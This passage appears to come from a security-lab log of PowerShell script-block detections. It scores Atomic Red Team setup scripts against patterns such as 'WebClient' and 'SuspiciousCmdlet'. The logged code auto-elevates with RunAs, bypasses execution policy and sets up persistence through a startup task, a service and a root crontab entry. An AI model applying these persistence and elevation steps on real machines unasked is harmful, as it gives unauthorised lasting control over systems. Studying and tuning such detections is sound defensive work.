computer renaming causes AD replication delays\n            $triggers = @()\n            foreach ($delay in $delays) {\n                $trigger = New-ScheduledTaskTrigger -AtStartup\n                $trigger.Delay = \"PT$delay`M\"\n                $triggers += $trigger\n            }\n            $task = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $triggers -Description \"A task that runs 1 minute or later after boot to start the atomic test runner script\"\n            try {\n                $null = Register-ScheduledTask -TaskName $taskName -InputObject $task -User $artConfig.user -Password $($cred.GetNetworkCredential().password) -ErrorAction Stop\n            }\n            catch {\n                if ($_.CategoryInfo.Category -eq \"AuthenticationError\") {\n                    # remove the credential file if the password didn't work\n                    Write-Error \"The credentials you entered are incorrect. Please run the setup script again and double check the username and password.\"\n                    Remove-Item $artConfig.credFile\n                }\n                else {\n                    Throw $_\n                }\n            }\n\n            # remove the atomicrunnerservice now that we are using a scheduled task instead\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -Remove\n        }\n        elseif (-not $SkipServiceSetup) {\n            # create the service that will start the runner after each restart\n            # The user must have the \"Log on as a service\" right. To add that right, open the Local Security Policy management console, go to the\n            # \"\\Security Settings\\Local Policies\\User Rights Assignments\" folder, and edit the \"Log on as a service\" policy there.\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -Remove\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -UserName $artConfig.user -installDir $artConfig.serviceInstallDir -Setup\n            Add-EnvPath -Container Machine -Path $artConfig.serviceInstallDir\n            # set service start retry options\n            $ServiceDisplayName = \"AtomicRunnerService\"\n            $action1, $action2, $action3 = \"restart\"\n            $time1 = 600000 # 10 minutes in miliseconds\n            $action2 = \"restart\"\n            $time2 = 600000 # 10 minutes in miliseconds\n            $actionLast = \"restart\"\n            $timeLast = 3600000 # 1 hour in miliseconds\n            $resetCounter = 86400 # 1 day in seconds\n            $services = Get-CimInstance -ClassName 'Win32_Service' | Where-Object { $_.DisplayName -imatch $ServiceDisplayName }\n            $action = $action1 + \"/\" + $time1 + \"/\" + $action2 + \"/\" + $time2 + \"/\" + $actionLast + \"/\" + $timeLast\n            foreach ($service in $services) {\n                # https://technet.microsoft.com/en-us/library/cc742019.aspx\n                $output = sc.exe  failure $($service.Name) actions= $action reset= $resetCounter\n            }\n            # set service to delayed auto-start (doesn't reflect in the services console until after a reboot)\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AtomicRunnerService\" -Name Start -Value 2\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AtomicRunnerService\" -Name DelayedAutostart -Value 1\n\n            # remove scheduled task now that we are using a service instead\n            Unregister-ScheduledTask \"KickOff-AtomicRunner\" -confirm:$false -ErrorAction Ignore\n        }\n    }\n    else {\n        # sets cronjob string using basepath from config.ps1\n        $pwshPath = which pwsh\n        $job = \"@reboot root sleep 60;$pwshPath -Command Invoke-KickoffAtomicRunner\"\n        $exists = cat /etc/crontab | Select-String -Quiet \"KickoffAtomicRunner\"\n        #checks if the Kickoff-AtomicRunner job exists. If not appends it to the system crontab.\n        if ($null -eq $exists) {\n            $(Write-Output \"$job\" >> /etc/crontab)\n            write-host \"setting cronjob\"\n        }\n        else {\n            write-host \"cronjob already exists\"\n        }\n    }\n\n    # Add Import-Module statement to the PowerShell profile\n    $root = Split-Path $PSScriptRoot -Parent\n    $pathToPSD1 = Join-Path $root \"Invoke-AtomicRedTeam.psd1\"\n    $importStatement = \"Import-Module \"\"$pathToPSD1\"\" -Force\"\n    $profileFolder = Split-Path $profile\n    New-Item -ItemType Directory -Force -Path $profileFolder | Out-Null\n    New-Item $PROFILE -ErrorAction Ignore\n    $profileContent = Get-Content $profile\n    $line = $profileContent | Select-String \".*import-module.*invoke-atomicredTeam.psd1\" | Select-Object -ExpandProperty Line\n    if ($line) {\n        $profileContent | ForEach-Object { $_.replace( $line, \"$importStatement\") } | Set-Content $profile\n    }\n    else {\n        Add-Content $profile $importStatement\n    }\n\n    # Install the Posh-SYLOG module if we are configured to use it and it is not already installed\n    if ((-not (Get-Module -ListAvailable \"Posh-SYSLOG\")) -and [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {\n        write-verbose \"Posh-SYSLOG\"\n        Install-Module -Name Posh-SYSLOG -Scope CurrentUser -Force\n    }\n\n    # create the CSV schedule of atomics to run if it doesn't exist\n    if (-not (Test-Path $artConfig.scheduleFile)) {\n        Invoke-GenerateNewSchedule\n    }\n\n    $schedule = Get-Schedule\n    if ($null -eq $schedule) {\n        Write-Host -ForegroundColor Yellow \"There are no tests enabled on the schedule, set the 'Enabled' column to 'True' for the atomic test that you want to run. The schedule file is found here: $($artConfig.scheduleFile)\"\n        Write-Host -ForegroundColor Yellow \"Rerun this setup script after updating the schedule\"\n    }\n    else {\n        # Get the prereqs for all of the tests on the schedule\n        Invoke-AtomicRunner -GetPrereqs\n    }\n}\n\n# Add-EnvPath from https://gist.github.com/mkropat/c1226e0cc2ca941b23a9\nfunction Add-EnvPath {\n    param(\n        [Parameter(Mandatory = $true)]\n        [string] $Path,\n\n        [ValidateSet('Machine', 'User', 'Session')]\n        [string] $Container = 'Session'\n    )\n\n    if ($Container -ne 'Session') {\n        $containerMapping = @{\n            Machine = [EnvironmentVariableTarget]::Machine\n            User    = [EnvironmentVariableTarget]::User\n        }\n        $containerType = $containerMapping[$Container]\n\n        $persistedPaths = [Environment]::GetEnvironmentVariable('Path', $containerType) -split ';'\n        if ($persistedPaths -notcontains $Path) {\n            $persistedPaths = $persistedPaths + $Path | Where-Object { $_ }\n            [Environment]::SetEnvironmentVariable('Path', $persistedPaths -join ';', $containerType)\n        }\n    }\n\n    $envPaths = $env:Path -split ';'\n    if ($envPaths -notcontains $Path) {\n        $envPaths = $envPaths + $Path | Where-Object { $_ }\n        $env:Path = $envPaths -join ';'\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousCmdlet' matched: 'Verb RunAs'\nPattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'"
    },
    {
      "timestamp": "2024-12-16T20:34:57.2424222+00:00",
      "event_id": 35711085,
      "risk_score": 8,
      "detected_patterns": ", SuspiciousCmdlet, WebClient, Get, SuspiciousKeyword",
      "pattern_details": "SuspiciousCmdlet [Score: 1]; WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]",
      "command_length": 10264,
      "full_command": "function Invoke-SetupAtomicRunner {\n\n    [CmdletBinding(\n        SupportsShouldProcess = $true,\n        PositionalBinding = $false,\n        ConfirmImpact = 'Medium')]\n    Param(\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $SkipServiceSetup,\n\n        [Parameter(Mandatory = $false)]\n        [switch]\n        $asScheduledtask\n    )\n\n    # ensure running with admin privs\n    if ($artConfig.OS -eq \"windows\") {\n        # auto-elevate on Windows\n        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())\n        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)\n        if ($testadmin -eq $false) {\n            Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file \"{0}\" -elevated' -f ($myinvocation.MyCommand.Definition))\n            exit $LASTEXITCODE\n        }\n    }\n    else {\n        # linux and macos check - doesn't auto-elevate\n        if ((id -u) -ne 0 ) {\n            Throw \"You must run the Invoke-SetupAtomicRunner script as root\"\n            exit\n        }\n    }\n\n    if ($artConfig.basehostname.length -gt 15) { Throw \"The hostname for this machine (minus the GUID) must be 15 characters or less. Please rename this computer.\" }\n\n    #create AtomicRunner-Logs directories if they don't exist\n    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore\n    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore\n\n    if ($artConfig.OS -eq \"windows\") {\n        if ($asScheduledtask) {\n            if (Test-Path $artConfig.credFile) {\n                Write-Host \"Credential File $($artConfig.credFile) already exists, not prompting for creation of a new one.\"\n                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $artConfig.user, (Get-Content $artConfig.credFile | ConvertTo-SecureString)\n            }\n            else {\n                # create credential file for the user since we aren't using a group managed service account\n                $cred = Get-Credential -UserName $artConfig.user -message \"Enter password for $($artConfig.user) in order to create the runner scheduled task\"\n                $cred.Password | ConvertFrom-SecureString | Out-File $artConfig.credFile\n            }\n            # setup scheduled task that will start the runner after each restart\n            # local security policy --> Local Policies --> Security Options --> Network access: Do not allow storage of passwords and credentials for network authentication must be disabled\n            $taskName = \"KickOff-AtomicRunner\"\n            Unregister-ScheduledTask $taskName -confirm:$false -ErrorAction Ignore\n            # Windows scheduled task includes a 20 minutes sleep then restart if the call to Invoke-KickoffAtomicRunner fails\n            # this occurs occassionally when Windows has issues logging into the runner user's account and logs in as a TEMP user\n            $taskAction = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-exec bypass -Command Invoke-KickoffAtomicRunner; Start-Sleep 1200; Restart-Computer -Force\"\n            $taskPrincipal = New-ScheduledTaskPrincipal -UserId $artConfig.user\n            $delays = @(1, 2, 4, 8, 16, 32, 64) # using multiple triggers as a retry mechanism because the built-in retry mechanism doesn't work when the computer renaming causes AD replication delays\n            $triggers = @()\n            foreach ($delay in $delays) {\n                $trigger = New-ScheduledTaskTrigger -AtStartup\n                $trigger.Delay = \"PT$delay`M\"\n                $triggers += $trigger\n            }\n            $task = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $triggers -Description \"A task that runs 1 minute or later after boot to start the atomic test runner script\"\n            try {\n                $null = Register-ScheduledTask -TaskName $taskName -InputObject $task -User $artConfig.user -Password $($cred.GetNetworkCredential().password) -ErrorAction Stop\n            }\n            catch {\n                if ($_.CategoryInfo.Category -eq \"AuthenticationError\") {\n                    # remove the credential file if the password didn't work\n                    Write-Error \"The credentials you entered are incorrect. Please run the setup script again and double check the username and password.\"\n                    Remove-Item $artConfig.credFile\n                }\n                else {\n                    Throw $_\n                }\n            }\n\n            # remove the atomicrunnerservice now that we are using a scheduled task instead\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -Remove\n        }\n        elseif (-not $SkipServiceSetup) {\n            # create the service that will start the runner after each restart\n            # The user must have the \"Log on as a service\" right. To add that right, open the Local Security Policy management console, go to the\n            # \"\\Security Settings\\Local Policies\\User Rights Assignments\" folder, and edit the \"Log on as a service\" policy there.\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -Remove\n            . \"$PSScriptRoot\\AtomicRunnerService.ps1\" -UserName $artConfig.user -installDir $artConfig.serviceInstallDir -Setup\n            Add-EnvPath -Container Machine -Path $artConfig.serviceInstallDir\n            # set service start retry options\n            $ServiceDisplayName = \"AtomicRunnerService\"\n            $action1, $action2, $action3 = \"restart\"\n            $time1 = 600000 # 10 minutes in miliseconds\n            $action2 = \"restart\"\n            $time2 = 600000 # 10 minutes in miliseconds\n            $actionLast = \"restart\"\n            $timeLast = 3600000 # 1 hour in miliseconds\n            $resetCounter = 86400 # 1 day in seconds\n            $services = Get-CimInstance -ClassName 'Win32_Service' | Where-Object { $_.DisplayName -imatch $ServiceDisplayName }\n            $action = $action1 + \"/\" + $time1 + \"/\" + $action2 + \"/\" + $time2 + \"/\" + $actionLast + \"/\" + $timeLast\n            foreach ($service in $services) {\n                # https://technet.microsoft.com/en-us/library/cc742019.aspx\n                $output = sc.exe  failure $($service.Name) actions= $action reset= $resetCounter\n            }\n            # set service to delayed auto-start (doesn't reflect in the services console until after a reboot)\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AtomicRunnerService\" -Name Start -Value 2\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\AtomicRunnerService\" -Name DelayedAutostart -Value 1\n\n            # remove scheduled task now that we are using a service instead\n            Unregister-ScheduledTask \"KickOff-AtomicRunner\" -confirm:$false -ErrorAction Ignore\n        }\n    }\n    else {\n        # sets cronjob string using basepath from config.ps1\n        $pwshPath = which pwsh\n        $job = \"@reboot root sleep 60;$pwshPath -Command Invoke-KickoffAtomicRunner\"\n        $exists = cat /etc/crontab | Select-String -Quiet \"KickoffAtomicRunner\"\n        #checks if the Kickoff-AtomicRunner job exists. If not appends it to the system crontab.\n        if ($null -eq $exists) {\n            $(Write-Output \"$job\" >> /etc/crontab)\n            write-host \"setting cronjob\"\n        }\n        else {\n            write-host \"cronjob already exists\"\n        }\n    }\n\n    # Add Import-Module statement to the PowerShell profile\n    $root = Split-Path $PSScriptRoot -Parent\n    $pathToPSD1 = Join-Path $root \"Invoke-AtomicRedTeam.psd1\"\n    $importStatement = \"Import-Module \"\"$pathToPSD1\"\" -Force\"\n    $profileFolder = Split-Path $profile\n    New-Item -ItemType Directory -Force -Path $profileFolder | Out-Null\n    New-Item $PROFILE -ErrorAction Ignore\n    $profileContent = Get-Content $profile\n    $line = $profileContent | Select-String \".*import-module.*invoke-atomicredTeam.psd1\" | Select-Object -ExpandProperty Line\n    if ($line) {\n        $profileContent | ForEach-Object { $_.replace( $line, \"$importStatement\") } | Set-Content $profile\n    }\n    else {\n        Add-Content $profile $importStatement\n    }\n\n    # Install the Posh-SYLOG module if we are configured to use it and it is not already installed\n    if ((-not (Get-Module -ListAvailable \"Posh-SYSLOG\")) -and [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {\n        write-verbose \"Posh-SYSLOG\"\n        Install-Module -Name Posh-SYSLOG -Scope CurrentUser -Force\n    }\n\n    # create the CSV schedule of atomics to run if it doesn't exist\n    if (-not (Test-Path $artConfig.scheduleFile)) {\n        Invoke-GenerateNewSchedule\n    }\n\n    $schedule = Get-Schedule\n    if ($null -eq $schedule) {\n        Write-Host -ForegroundColor Yellow \"There are no tests enabled on the schedule, set the 'Enabled' column to 'True' for the atomic test that you want to run. The schedule file is found here: $($artConfig.scheduleFile)\"\n        Write-Host -ForegroundColor Yellow \"Rerun this setup script after updating the schedule\"\n    }\n    else {\n        # Get the prereqs for all of the tests on the schedule\n        Invoke-AtomicRunner -GetPrereqs\n    }\n}\n\n# Add-EnvPath from https://gist.github.com/mkropat/c1226e0cc2ca941b23a9\nfunction Add-EnvPath {\n    param(\n        [Parameter(Mandatory = $true)]\n        [string] $Path,\n\n        [ValidateSet('Machine', 'User', 'Session')]\n        [string] $Container = 'Session'\n    )\n\n    if ($Container -ne 'Session') {\n        $containerMapping = @{\n            Machine = [EnvironmentVariableTarget]::Machine\n            User    = [EnvironmentVariableTarget]::User\n        }\n        $containerType = $containerMapping[$Container]\n\n        $persistedPaths = [Environment]::GetEnvironmentVariable('Path', $containerType) -split ';'\n        if ($persistedPaths -notcontains $Path) {\n            $persistedPaths = $persistedPaths + $Path | Where-Object { $_ }\n            [Environment]::SetEnvironmentVariable('Path', $persistedPaths -join ';', $containerType)\n        }\n    }\n\n    $envPaths = $env:Path -split ';'\n    if ($envPaths -notcontains $Path) {\n        $envPaths = $envPaths + $Path | Where-Object { $_ }\n        $env:Path = $envPaths -join ';'\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'SuspiciousCmdlet' matched: 'Verb RunAs'\nPattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'Start-Process'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.7913501+00:00",
      "event_id": 35711009,
      "risk_score": 7,
      "detected_patterns": ", WebClient, SuspiciousKeyword, Reflection",
      "pattern_details": "WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]",
      "command_length": 2194,
      "full_command": "# Copyright 2016 Cloudbase Solutions Srl\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path\n\nfunction Load-Assembly {\n    $libDir = Join-Path $here \"lib\"\n    $assemblies = @{\n        \"core\" = Join-Path $libDir \"netstandard2.1\\YamlDotNet.dll\";\n        \"net45\" = Join-Path $libDir \"net45\\YamlDotNet.dll\";\n        \"net35\" = Join-Path $libDir \"net35\\YamlDotNet.dll\";\n    }\n\n    if ($PSVersionTable.Keys -contains \"PSEdition\") {\n        if ($PSVersionTable.PSEdition -eq \"Core\") {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"core\"])\n        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net45\"])\n        } else {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n        }\n    } else { # Powershell 4.0 and lower do not know \"PSEdition\" yet\n        return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n    }\n}\n\n\nfunction Initialize-Assemblies {\n    $requiredTypes = @(\n        \"Parser\", \"MergingParser\", \"YamlStream\",\n        \"YamlMappingNode\", \"YamlSequenceNode\",\n        \"YamlScalarNode\", \"ChainedEventEmitter\",\n        \"Serializer\", \"Deserializer\", \"SerializerBuilder\",\n        \"StaticTypeResolver\"\n    )\n\n    $type = \"YamlDotNet.Serialization.Serializer\" -as [type]\n    if (!$type) {\n        return Load-Assembly\n    }\n\n    $yaml = $type.Assembly\n    foreach ($i in $requiredTypes){\n        if ($i -notin $yaml.DefinedTypes.Name) {\n            Throw \"YamlDotNet is loaded but missing required types ($i). Older version installed on system?\"\n        }\n    }\n}\n\nInitialize-Assemblies | Out-Null\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.7603192+00:00",
      "event_id": 35710631,
      "risk_score": 7,
      "detected_patterns": ", WebClient, SuspiciousKeyword, Reflection",
      "pattern_details": "WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]",
      "command_length": 2194,
      "full_command": "# Copyright 2016 Cloudbase Solutions Srl\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path\n\nfunction Load-Assembly {\n    $libDir = Join-Path $here \"lib\"\n    $assemblies = @{\n        \"core\" = Join-Path $libDir \"netstandard2.1\\YamlDotNet.dll\";\n        \"net45\" = Join-Path $libDir \"net45\\YamlDotNet.dll\";\n        \"net35\" = Join-Path $libDir \"net35\\YamlDotNet.dll\";\n    }\n\n    if ($PSVersionTable.Keys -contains \"PSEdition\") {\n        if ($PSVersionTable.PSEdition -eq \"Core\") {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"core\"])\n        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net45\"])\n        } else {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n        }\n    } else { # Powershell 4.0 and lower do not know \"PSEdition\" yet\n        return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n    }\n}\n\n\nfunction Initialize-Assemblies {\n    $requiredTypes = @(\n        \"Parser\", \"MergingParser\", \"YamlStream\",\n        \"YamlMappingNode\", \"YamlSequenceNode\",\n        \"YamlScalarNode\", \"ChainedEventEmitter\",\n        \"Serializer\", \"Deserializer\", \"SerializerBuilder\",\n        \"StaticTypeResolver\"\n    )\n\n    $type = \"YamlDotNet.Serialization.Serializer\" -as [type]\n    if (!$type) {\n        return Load-Assembly\n    }\n\n    $yaml = $type.Assembly\n    foreach ($i in $requiredTypes){\n        if ($i -notin $yaml.DefinedTypes.Name) {\n            Throw \"YamlDotNet is loaded but missing required types ($i). Older version installed on system?\"\n        }\n    }\n}\n\nInitialize-Assemblies | Out-Null\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
    },
    {
      "timestamp": "2024-12-16T20:34:53.9629277+00:00",
      "event_id": 35710492,
      "risk_score": 7,
      "detected_patterns": ", WebClient, SuspiciousKeyword, Reflection",
      "pattern_details": "WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]",
      "command_length": 2194,
      "full_command": "# Copyright 2016 Cloudbase Solutions Srl\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path\n\nfunction Load-Assembly {\n    $libDir = Join-Path $here \"lib\"\n    $assemblies = @{\n        \"core\" = Join-Path $libDir \"netstandard2.1\\YamlDotNet.dll\";\n        \"net45\" = Join-Path $libDir \"net45\\YamlDotNet.dll\";\n        \"net35\" = Join-Path $libDir \"net35\\YamlDotNet.dll\";\n    }\n\n    if ($PSVersionTable.Keys -contains \"PSEdition\") {\n        if ($PSVersionTable.PSEdition -eq \"Core\") {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"core\"])\n        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net45\"])\n        } else {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n        }\n    } else { # Powershell 4.0 and lower do not know \"PSEdition\" yet\n        return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n    }\n}\n\n\nfunction Initialize-Assemblies {\n    $requiredTypes = @(\n        \"Parser\", \"MergingParser\", \"YamlStream\",\n        \"YamlMappingNode\", \"YamlSequenceNode\",\n        \"YamlScalarNode\", \"ChainedEventEmitter\",\n        \"Serializer\", \"Deserializer\", \"SerializerBuilder\",\n        \"StaticTypeResolver\"\n    )\n\n    $type = \"YamlDotNet.Serialization.Serializer\" -as [type]\n    if (!$type) {\n        return Load-Assembly\n    }\n\n    $yaml = $type.Assembly\n    foreach ($i in $requiredTypes){\n        if ($i -notin $yaml.DefinedTypes.Name) {\n            Throw \"YamlDotNet is loaded but missing required types ($i). Older version installed on system?\"\n        }\n    }\n}\n\nInitialize-Assemblies | Out-Null\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.4524307+00:00",
      "event_id": 35710576,
      "risk_score": 7,
      "detected_patterns": ", WebClient, Get, SuspiciousKeyword",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]",
      "command_length": 13819,
      "full_command": "function Start-AtomicGUI {\n    param (\n        [Int] $port = 8487\n    )\n    # Install-Module UniversalDashboard if not already installed\n    $UDcommunityInstalled = Get-InstalledModule -Name \"UniversalDashboard.Community\" -ErrorAction:SilentlyContinue\n    $UDinstalled = Get-InstalledModule -Name \"UniversalDashboard\" -ErrorAction:SilentlyContinue\n    if (-not $UDcommunityInstalled -and -not $UDinstalled) {\n        Write-Host \"Installing UniversalDashboard.Community\"\n        Install-Module -Name UniversalDashboard.Community -Scope CurrentUser -Force\n    }\n\n    ############## Function Definitions Made Available to EndPoints\n    function New-UDTextAreaX ($ID, $PlaceHolder) {\n        New-UDElement -Tag div -Attributes @{class = \"input-field col\" } -Content {\n            New-UDElement -Tag \"textarea\" -id  $ID -Attributes @{ class = \"materialize-textarea ud-input\" }\n            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }\n        }\n    }\n\n    function New-UDTextBoxX ($ID, $PlaceHolder) {\n        New-UDElement -Tag div -Attributes @{class = \"input-field col\" } -Content {\n            New-UDElement -Tag \"input\" -id $ID -Attributes @{ class = \"ud-input\"; type = \"text\" }\n            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }\n        }\n    }\n\n    $InputArgCards = @{ }\n    function New-InputArgCard {\n        $cardNumber = $InputArgCards.count + 1\n        $newCard = New-UDCard -ID \"InputArgCard$cardNumber\" -Content {\n            New-UDTextBoxX \"InputArgCard$cardNumber-InputArgName\" \"Input Argument Name\"\n            New-UDTextAreaX \"InputArgCard$cardNumber-InputArgDescription\" \"Description\"\n            New-UDTextBoxX \"InputArgCard$cardNumber-InputArgDefault\" \"Default Value\"\n            New-UDLayout -columns 4 {\n                New-UDSelect -ID \"InputArgCard$cardNumber-InputArgType\" -Label \"Type\" -Option {\n                    New-UDSelectOption -Name \"Path\" -Value \"path\"\n                    New-UDSelectOption -Name \"String\" -Value \"string\"\n                    New-UDSelectOption -Name \"Url\" -Value \"url\"\n                    New-UDSelectOption -Name \"Integer\" -Value \"integer\"\n                }\n            }\n            New-UDButton -Text \"Remove this Input Argument\"  -OnClick (\n                New-UDEndpoint -Endpoint {\n                    Remove-UDElement -Id \"InputArgCard$cardNumber\"\n                    $inputArgCards[\"InputArgCard$cardNumber\"] = $true\n                } -ArgumentList @($cardNumber, $inputArgCards)\n            )\n        }\n        $InputArgCards.Add(\"InputArgCard$cardNumber\", $false) | Out-Null\n        $newCard\n    }\n\n    $depCards = @{ }\n    function New-depCard {\n        $cardNumber = $depCards.count + 1\n        $newCard = New-UDCard -ID \"depCard$cardNumber\" -Content {\n            New-UDTextBoxX \"depCard$cardNumber-depDescription\" \"Prereq Description\"\n            New-UDTextAreaX \"depCard$cardNumber-prereqCommand\" \"Check prereqs Command\"\n            New-UDTextAreaX \"depCard$cardNumber-getPrereqCommand\" \"Get Prereqs Command\"\n            New-UDButton -Text \"Remove this Prereq\"  -OnClick (\n                New-UDEndpoint -Endpoint {\n                    Remove-UDElement -Id \"depCard$cardNumber\"\n                    $depCards[\"depCard$cardNumber\"] = $true\n                } -ArgumentList @($cardNumber, $depCards)\n            )\n        }\n        $depCards.Add(\"depCard$cardNumber\", $false) | Out-Null\n        $newCard\n    }\n\n    function New-UDSelectX ($Id, $Label) {\n        New-UDSelect -Label $Label -Id $Id -Option {\n            New-UDSelectOption -Name \"PowerShell\" -Value \"PowerShell\" -Selected\n            New-UDSelectOption -Name \"Command Prompt\" -Value \"CommandPrompt\"\n            New-UDSelectOption -Name \"Bash\" -Value \"Bash\"\n            New-UDSelectOption -Name \"Sh\" -Value \"Sh\"\n        }\n    }\n\n    ############## End Function Definitions Made Available to EndPoints\n\n    # EndpointInitialization defining which methods, modules, and variables will be available for use within an endpoint\n    $ei = New-UDEndpointInitialization `\n        -Function @(\"New-InputArgCard\", \"New-depCard\", \"New-UDTextAreaX\", \"New-UDTextBoxX\", \"New-UDSelectX\") `\n        -Variable @(\"InputArgCards\", \"depCards\", \"yaml\") `\n        -Module @(\"..\\Invoke-AtomicRedTeam.psd1\")\n\n    ############## EndPoint (ep) Definitions: Dynamic code called to generate content for an element or perfrom onClick actions\n    $BuildAndDisplayYamlScriptBlock = {\n        $testName = (Get-UDElement -Id atomicName).Attributes['value']\n        $testDesc = (Get-UDElement -Id atomicDescription).Attributes['value']\n        $platforms = @()\n        if ((Get-UDElement -Id spWindows).Attributes['checked']) { $platforms += \"Windows\" }\n        if ((Get-UDElement -Id spLinux).Attributes['checked']) { $platforms += \"Linux\" }\n        if ((Get-UDElement -Id spMacOS).Attributes['checked']) { $platforms += \"macOS\" }\n        $attackCommands = (Get-UDElement -Id attackCommands).Attributes['value']\n        $executor = (Get-UDElement -Id executorSelector).Attributes['value']\n        $elevationRequired = (Get-UDElement -Id elevationRequired).Attributes['checked']\n        $cleanupCommands = (Get-UDElement -Id cleanupCommands).Attributes['value']\n        if (\"\" -eq $executor) { $executor = 